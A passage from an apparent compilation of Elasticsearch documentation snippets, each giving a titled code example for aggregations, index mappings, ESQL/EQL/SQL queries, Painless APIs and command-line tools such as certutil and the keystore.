\"load_time\",\n        \"percents\": [ 95, 99, 99.9 ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in MAD Aggregation\nDESCRIPTION: Demonstrates how to handle missing values in median absolute deviation calculation by specifying a default value for documents missing the target field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-median-absolute-deviation-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET reviews/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"review_variability\": {\n      \"median_absolute_deviation\": {\n        \"field\": \"rating\",\n        \"missing\": 5\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating X.509 Certificates with elasticsearch-certutil\nDESCRIPTION: This command generates X.509 certificates and private keys using a previously created CA. It prompts for the CA password, output filename, and password, which can also be specified using the --ca-pass, --out, and --pass parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certutil.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nbin/elasticsearch-certutil cert --ca elastic-stack-ca.p12\n```\n\n----------------------------------------\n\nTITLE: Using MV_MIN Function in ESQL to Find Minimum Value\nDESCRIPTION: This snippet demonstrates how to use the MV_MIN function in ESQL to convert a multivalued expression into a single value containing the minimum value. It creates a row with a multivalued field 'a' and then applies MV_MIN to find the minimum value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_min.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[2, 1]\n| EVAL min_a = MV_MIN(a)\n```\n\n----------------------------------------\n\nTITLE: Querying Boxplot Aggregation in Elasticsearch\nDESCRIPTION: This example shows how to perform a search query with a boxplot aggregation on the 'load_time' field, including the full request and response structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-boxplot-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_boxplot\": {\n      \"boxplot\": {\n        \"field\": \"load_time\"\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n\n \"aggregations\": {\n    \"load_time_boxplot\": {\n      \"min\": 0.0,\n      \"max\": 990.0,\n      \"q1\": 167.5,\n      \"q2\": 445.0,\n      \"q3\": 722.5,\n      \"lower\": 0.0,\n      \"upper\": 990.0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Single Field Index Sorting in Elasticsearch\nDESCRIPTION: Shows how to create an index with sorting configured on a single date field in descending order. Demonstrates basic index sorting setup with field mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/sorting.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"index\": {\n      \"sort.field\": \"date\",\n      \"sort.order\": \"desc\"\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"date\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing documents with constant_keyword fields in Elasticsearch\nDESCRIPTION: Shows two equivalent ways to index documents with a constant_keyword field: explicitly providing the value that matches the mapping configuration or omitting the field entirely.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/keyword.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST logs-debug/_doc\n{\n  \"date\": \"2019-12-12\",\n  \"message\": \"Starting up Elasticsearch\",\n  \"level\": \"debug\"\n}\n\nPOST logs-debug/_doc\n{\n  \"date\": \"2019-12-12\",\n  \"message\": \"Starting up Elasticsearch\"\n}\n```\n\n----------------------------------------\n\nTITLE: Java Keystore (JKS) SSL Configuration Settings\nDESCRIPTION: Configuration settings for using Java keystore files for SSL in Elasticsearch. Includes settings for keystore path, passwords, and truststore configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.http.ssl.keystore.path: path/to/keystore.jks\nxpack.http.ssl.keystore.secure_password: keystorepass\nxpack.http.ssl.keystore.secure_key_password: keypass\nxpack.http.ssl.truststore.path: path/to/truststore.jks\nxpack.http.ssl.truststore.secure_password: truststorepass\n```\n\n----------------------------------------\n\nTITLE: Cancelling Reindex Operation in Elasticsearch\nDESCRIPTION: This API call cancels an ongoing reindex operation for a specific data stream in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /_migration/reindex/my-data-stream/_cancel\n```\n\n----------------------------------------\n\nTITLE: Creating Index and Inserting Shape Data for Cartesian-bounds Aggregation\nDESCRIPTION: This snippet demonstrates creating an index with a Shape field and inserting sample place data for use with the cartesian-bounds aggregation on shapes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-bounds-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /places\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geometry\": {\n        \"type\": \"shape\"\n      }\n    }\n  }\n}\n\nPOST /places/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"name\": \"NEMO Science Museum\", \"geometry\": \"POINT(491.2350 5237.4081)\" }\n{\"index\":{\"_id\":2}}\n{\"name\": \"Sportpark De Weeren\", \"geometry\": { \"type\": \"Polygon\", \"coordinates\": [ [ [ 496.5305328369141, 5239.347642069457 ], [ 496.6979026794433, 5239.1721758934835 ], [ 496.9425201416015, 5239.238958618537 ], [ 496.7944622039794, 5239.420969150824 ], [ 496.5305328369141, 5239.347642069457 ] ] ] } }\n```\n\n----------------------------------------\n\nTITLE: Searching Against a Standard Text Field with File Paths in Elasticsearch\nDESCRIPTION: This example performs a match query against the file_path field, which uses standard analysis and matches all documents containing parts of the path, with Bob's documents ranking highest due to term frequency.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pathhierarchy-tokenizer.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET file-path-test/_search\n{\n  \"query\": {\n    \"match\": {\n      \"file_path\": \"/User/bob/photos/2017/05\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Low-precision Geohash Grid Aggregation in Elasticsearch\nDESCRIPTION: This example shows how to perform a low-precision geohash_grid aggregation on the museums index, using a precision of 3.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohashgrid-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"large-grid\": {\n      \"geohash_grid\": {\n        \"field\": \"location\",\n        \"precision\": 3\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining _source and filter_path in Elasticsearch Search\nDESCRIPTION: Shows how to combine the _source parameter with filter_path to filter specific fields in the search results. This example indexes three documents and then retrieves only the title field, sorted by rating.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/common-options.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /library/_doc?refresh\n{\"title\": \"Book #1\", \"rating\": 200.1}\nPOST /library/_doc?refresh\n{\"title\": \"Book #2\", \"rating\": 1.7}\nPOST /library/_doc?refresh\n{\"title\": \"Book #3\", \"rating\": 0.1}\nGET /_search?filter_path=hits.hits._source&_source=title&sort=rating:desc\n```\n\n----------------------------------------\n\nTITLE: Defining java.util.Map Methods in Painless\nDESCRIPTION: This snippet details the methods available in the java.util.Map interface, which is crucial for key-value pair management in Painless. It includes methods for querying, modifying, and iterating over map entries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.Map {\n  void clear()\n  def compute(def,BiFunction)\n  def computeIfAbsent(def,Function)\n  def computeIfPresent(def,BiFunction)\n  boolean containsKey(def)\n  boolean containsValue(def)\n  Set entrySet()\n  boolean equals(Object)\n  void forEach(BiConsumer)\n  def get(def)\n  def getOrDefault(def,def)\n  boolean isEmpty()\n  Set keySet()\n  def merge(def,def,BiFunction)\n  def put(def,def)\n  void putAll(Map)\n  def putIfAbsent(def,def)\n  def remove(def)\n  boolean remove(def,def)\n  def replace(def,def)\n  boolean replace(def,def,def)\n  void replaceAll(BiFunction)\n  int size()\n  Collection values()\n  Object org.elasticsearch.painless.api.Augmentation getByPath(String)\n  Object org.elasticsearch.painless.api.Augmentation getByPath(String, Object)\n\n  # some adaptations of groovy methods\n  List org.elasticsearch.painless.api.Augmentation collect(BiFunction)\n  def org.elasticsearch.painless.api.Augmentation collect(Collection,BiFunction)\n  int org.elasticsearch.painless.api.Augmentation count(BiPredicate)\n  def org.elasticsearch.painless.api.Augmentation each(BiConsumer)\n  boolean org.elasticsearch.painless.api.Augmentation every(BiPredicate)\n  Map.Entry org.elasticsearch.painless.api.Augmentation find(BiPredicate)\n  Map org.elasticsearch.painless.api.Augmentation findAll(BiPredicate)\n  def org.elasticsearch.painless.api.Augmentation findResult(BiFunction)\n  def org.elasticsearch.painless.api.Augmentation findResult(def,BiFunction)\n  List org.elasticsearch.painless.api.Augmentation findResults(BiFunction)\n  Map org.elasticsearch.painless.api.Augmentation groupBy(BiFunction)\n}\n```\n\n----------------------------------------\n\nTITLE: Highlighting Entire Field Content Without Fragmentation\nDESCRIPTION: This snippet demonstrates how to return the entire content of a field (blog.title) by setting 'number_of_fragments' to 0, which prevents fragmentation and returns the whole highlighted field content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_21\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\" : {\n    \"fields\" : {\n      \"body\" : {},\n      \"blog.title\" : {\"number_of_fragments\" : 0}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Boolean Field Aggregations and Runtime Fields in Elasticsearch\nDESCRIPTION: Demonstrates using boolean fields in aggregations, sorting, and runtime fields. Shows how boolean values are represented in terms aggregations and their usage in scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/boolean.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST my-index-000001/_doc/1?refresh\n{\n  \"is_published\": true\n}\n\nPOST my-index-000001/_doc/2?refresh\n{\n  \"is_published\": false\n}\n\nGET my-index-000001/_search\n{\n  \"aggs\": {\n    \"publish_state\": {\n      \"terms\": {\n        \"field\": \"is_published\"\n      }\n    }\n  },\n  \"sort\": [ \"is_published\" ],\n  \"fields\": [\n    {\"field\": \"weight\"}\n  ],\n  \"runtime_mappings\": {\n    \"weight\": {\n      \"type\": \"long\",\n      \"script\": \"emit(doc['is_published'].value ? 10 : 0)\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Recreating Pattern Analyzer as Custom Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to recreate the built-in `pattern` analyzer as a `custom` analyzer in Elasticsearch. This allows for further customization by adding token filters, such as lowercase conversion. It shows how to define a tokenizer and analyzer with specific settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-analyzer.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT /pattern_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"tokenizer\": {\n        \"split_on_non_word\": {\n          \"type\":       \"pattern\",\n          \"pattern\":    \"\\\\W+\" <1>\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_pattern\": {\n          \"tokenizer\": \"split_on_non_word\",\n          \"filter\": [\n            \"lowercase\"       <2>\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multiplication Operator in Painless\nDESCRIPTION: Illustrates the multiplication operator ('*') in Painless with different numeric types.  It shows how the result type is determined by the promotion rules, and provides an example with int and double types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_14\n\nLANGUAGE: painless\nCODE:\n```\nint i = 5*4;      <1>\ndouble d = i*7.0; <2>\n```\n\n----------------------------------------\n\nTITLE: Cross-Field Query with Forced Analyzer Group\nDESCRIPTION: Example showing how to force all fields into the same analyzer group by explicitly specifying the analyzer parameter, which changes how the query is executed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_13\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n   \"multi_match\" : {\n      \"query\":      \"Jon\",\n      \"type\":       \"cross_fields\",\n      \"analyzer\":   \"standard\", \n      \"fields\":     [ \"first\", \"last\", \"*.edge\" ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ORDER BY with LIMIT Example\nDESCRIPTION: Demonstrates sorting results by page_count in descending order with a LIMIT of 5 records.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_24\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM library ORDER BY page_count DESC LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: Nested Fields Mapping and Document Creation\nDESCRIPTION: Demonstrates creating an index with nested field mapping and indexing a document with nested user data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"group\" : { \"type\" : \"keyword\" },\n      \"user\": {\n        \"type\": \"nested\",\n        \"properties\": {\n          \"first\" : { \"type\" : \"keyword\" },\n          \"last\" : { \"type\" : \"keyword\" }\n        }\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1?refresh=true\n{\n  \"group\" : \"fans\",\n  \"user\" : [\n    {\n      \"first\" : \"John\",\n      \"last\" :  \"Smith\"\n    },\n    {\n      \"first\" : \"Alice\",\n      \"last\" :  \"White\"\n    }\n  ]\n}\n\nPOST my-index-000001/_search\n{\n  \"fields\": [\"*\"],\n  \"_source\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Output Tokens from Limit Token Filter in Elasticsearch\nDESCRIPTION: The resulting tokens after applying the limit token filter with max_token_count set to 2. Only the first two tokens from the original text are preserved.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-limit-token-count-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ quick, fox ]\n```\n\n----------------------------------------\n\nTITLE: Creating and Querying Boolean Fields in Elasticsearch\nDESCRIPTION: Shows how to create an index with a boolean field mapping, index a document with a boolean value, and query for documents using boolean values. The example demonstrates both string and native boolean value handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/boolean.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"is_published\": {\n        \"type\": \"boolean\"\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_doc/1?refresh\n{\n  \"is_published\": \"true\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n      \"is_published\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using MV_MIN Function in ESQL\nDESCRIPTION: Demonstrates how to use the MV_MIN function to convert a multivalued field to a single value, allowing arithmetic operations. The example shows indexing documents and using MV_MIN in an ESQL query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-multivalued-fields.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST /_query\n{\n  \"query\": \"FROM mv | EVAL b=MV_MIN(b) | EVAL b + 2, a + b | LIMIT 4\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 28,\n  \"is_partial\": false,\n  \"columns\": [\n    { \"name\": \"a\",   \"type\": \"long\"},\n    { \"name\": \"b\",   \"type\": \"long\"},\n    { \"name\": \"b + 2\", \"type\": \"long\"},\n    { \"name\": \"a + b\", \"type\": \"long\"}\n  ],\n  \"values\": [\n    [1, 1, 3, 2],\n    [2, 3, 5, 5]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to IP Values with TO_IP in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the TO_IP function in ESQL to convert string representations of IP addresses to IP values. It also shows how to use the converted IP value in a CIDR_MATCH function for IP range checking.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_ip.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str1 = \"1.1.1.1\", str2 = \"foo\"\n| EVAL ip1 = TO_IP(str1), ip2 = TO_IP(str2)\n| WHERE CIDR_MATCH(ip1, \"1.0.0.0/8\")\n```\n\n----------------------------------------\n\nTITLE: String Conversion Examples in EQL\nDESCRIPTION: Examples of converting various data types to strings using the string function, including numbers, booleans, and null handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_12\n\nLANGUAGE: eql\nCODE:\n```\nstring(42)               // returns \"42\"\nstring(42.5)             // returns \"42.5\"\nstring(\"regsvr32.exe\")   // returns \"regsvr32.exe\"\nstring(true)             // returns \"true\"\n\n// null handling\nstring(null)             // returns null\n```\n\n----------------------------------------\n\nTITLE: Custom Analyzer Creation with Keyword Marker\nDESCRIPTION: Creates a custom analyzer that combines keyword_marker filter with porter_stem filter, using keywords from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-marker-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_custom_analyzer\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"my_custom_keyword_marker_filter\",\n            \"porter_stem\"\n          ]\n        }\n      },\n      \"filter\": {\n        \"my_custom_keyword_marker_filter\": {\n          \"type\": \"keyword_marker\",\n          \"keywords_path\": \"analysis/example_word_list.txt\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: DATE_DIFF Example: Difference in Years\nDESCRIPTION: Demonstrates calculating the difference between two datetimes in years using DATE_DIFF. The query shows how to determine the number of years between two specified dates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_28\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_DIFF('years', '2019-09-04T11:22:33.000Z'::datetime, '2032-09-04T22:33:11.000Z'::datetime) AS \\\"diffInYears\\\";\\n\\n      diffInYears\n------------------------\n13\"\n```\n\n----------------------------------------\n\nTITLE: Salary Range Histogram in ESQL\nDESCRIPTION: Creates a histogram of employee salaries using numeric bucketing with 20 target buckets across a salary range.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS COUNT(*) by bs = BUCKET(salary, 20, 25324, 74999)\n| SORT bs\n```\n\n----------------------------------------\n\nTITLE: Setting ignore_malformed for Integer Fields in Elasticsearch Mapping\nDESCRIPTION: This snippet demonstrates how to set the ignore_malformed parameter for integer fields in an Elasticsearch index mapping. It shows the difference between a field with ignore_malformed set to true and one without it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/ignore-malformed.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"number_one\": {\n        \"type\": \"integer\",\n        \"ignore_malformed\": true\n      },\n      \"number_two\": {\n        \"type\": \"integer\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"text\":       \"Some text value\",\n  \"number_one\": \"foo\"\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"text\":       \"Some text value\",\n  \"number_two\": \"foo\"\n}\n```\n\n----------------------------------------\n\nTITLE: Partitioning Terms Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to partition a terms aggregation for processing large datasets. It filters account IDs into 20 partitions and processes one partition at a time, ordering by the last access date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_14\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n   \"size\": 0,\n   \"aggs\": {\n      \"expired_sessions\": {\n         \"terms\": {\n            \"field\": \"account_id\",\n            \"include\": {\n               \"partition\": 0,\n               \"num_partitions\": 20\n            },\n            \"size\": 10000,\n            \"order\": {\n               \"last_access\": \"asc\"\n            }\n         },\n         \"aggs\": {\n            \"last_access\": {\n               \"max\": {\n                  \"field\": \"access_date\"\n               }\n            }\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing an Elasticsearch Plugin\nDESCRIPTION: Command to remove a specific Elasticsearch plugin using the elasticsearch-plugin utility. After removal of a Java plugin, the node must be restarted to complete the removal process. Configuration files are preserved by default.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/listing-removing-updating.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin remove [pluginname]\n```\n\n----------------------------------------\n\nTITLE: most_fields Query Execution\nDESCRIPTION: This snippet shows how the `most_fields` type is executed internally as a bool query. It combines the scores from each match clause.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        { \"match\": { \"title\":          \"quick brown fox\" }},\n        { \"match\": { \"title.original\": \"quick brown fox\" }},\n        { \"match\": { \"title.shingles\": \"quick brown fox\" }}\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running a Basic EQL Search in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the EQL search API to run a basic EQL query. It searches for processes where the process name is 'regsvr32.exe'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    process where process.name == \"regsvr32.exe\"\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Converting String to Time Duration and Performing Date Arithmetic in ESQL\nDESCRIPTION: This snippet demonstrates how to convert a string to a time duration using the TO_TIMEDURATION function and perform date arithmetic operations. It shows adding and subtracting time durations from a datetime value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_timeduration.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW x = \"2024-01-01\"::datetime\n| EVAL y = x + \"3 hours\"::time_duration, z = x - TO_TIMEDURATION(\"3 hours\");\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Query Example for Process Events\nDESCRIPTION: An EQL sequence query that searches for a pattern of processes (attrib, bash, cat) executed in sequence by the same user. The query uses the 'by' keyword to track sequences separately for each unique user.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_38\n\nLANGUAGE: eql\nCODE:\n```\nsequence by user.name\n  [process where process.name == \"attrib\"]\n  [process where process.name == \"bash\"]\n  [process where process.name == \"cat\"]\n```\n\n----------------------------------------\n\nTITLE: Using Derivative Pipeline Aggregation with buckets_path\nDESCRIPTION: Example showing how to use a derivative pipeline aggregation embedded inside a date histogram. The buckets_path refers to a sibling metric called 'the_sum'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/pipeline.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"timestamp\",\n        \"calendar_interval\": \"day\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"lemmings\" }              <1>\n        },\n        \"the_deriv\": {\n          \"derivative\": { \"buckets_path\": \"the_sum\" } <2>\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Enabled Setting for Object Fields\nDESCRIPTION: Shows how to configure an index mapping with disabled parsing for specific object fields. The example demonstrates storing session data without indexing it, while still indexing user_id and last_updated fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/enabled.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"user_id\": {\n        \"type\":  \"keyword\"\n      },\n      \"last_updated\": {\n        \"type\": \"date\"\n      },\n      \"session_data\": {\n        \"type\": \"object\",\n        \"enabled\": false\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/session_1\n{\n  \"user_id\": \"kimchy\",\n  \"session_data\": {\n    \"arbitrary_object\": {\n      \"some_array\": [ \"foo\", \"bar\", { \"baz\": 2 } ]\n    }\n  },\n  \"last_updated\": \"2015-12-06T18:20:22\"\n}\n\nPUT my-index-000001/_doc/session_2\n{\n  \"user_id\": \"jpountz\",\n  \"session_data\": \"none\",\n  \"last_updated\": \"2015-12-06T18:22:13\"\n}\n```\n\n----------------------------------------\n\nTITLE: Converting String to Lowercase in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_LOWER function to convert a string to lowercase in an ESQL query. It creates a row with a 'message' field and then uses EVAL to create a new field 'message_lower' with the lowercase version of the message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_lower.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"Some Text\"\n| EVAL message_lower = TO_LOWER(message)\n```\n\n----------------------------------------\n\nTITLE: Creating Ingest Pipeline with Convert Processor in Elasticsearch\nDESCRIPTION: This example shows how to create an Elasticsearch ingest pipeline that converts the content of an 'id' field from its original type to an integer. The processor is configured without additional options like target_field, ignore_missing, etc., so it will perform an in-place conversion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/convert-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nPUT _ingest/pipeline/my-pipeline-id\n{\n  \"description\": \"converts the content of the id field to an integer\",\n  \"processors\" : [\n    {\n      \"convert\" : {\n        \"field\" : \"id\",\n        \"type\": \"integer\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Term Vectors with Search and Highlight in Elasticsearch\nDESCRIPTION: Demonstrates setting up an index with term vector configuration, indexing a document, and performing a search with highlighting. The example shows how to enable position and offset storage for the fast vector highlighter using term_vector setting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/term-vector.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\":        \"text\",\n        \"term_vector\": \"with_positions_offsets\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"text\": \"Quick brown fox\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"text\": \"brown fox\"\n    }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"text\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Add secure setting(s) to Elasticsearch keystore with prompts\nDESCRIPTION: Adds one or multiple secure settings to the keystore. Prompts for each setting's value and the keystore password if protected; use `--stdin` for input from standard input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbin/elasticsearch-keystore add the.setting.name.to.set\n```\n\n----------------------------------------\n\nTITLE: Height Conversion and Average Calculation in ESQL\nDESCRIPTION: Query that selects from employees table, converts height measurements to feet using a multiplication factor of 3.281, and calculates the average height in feet. The result shows an average height of approximately 5.80 feet.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/eval.csv-spec/evalUnnamedColumnStats.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL height * 3.281\n| STATS avg_height_feet = AVG(`height * 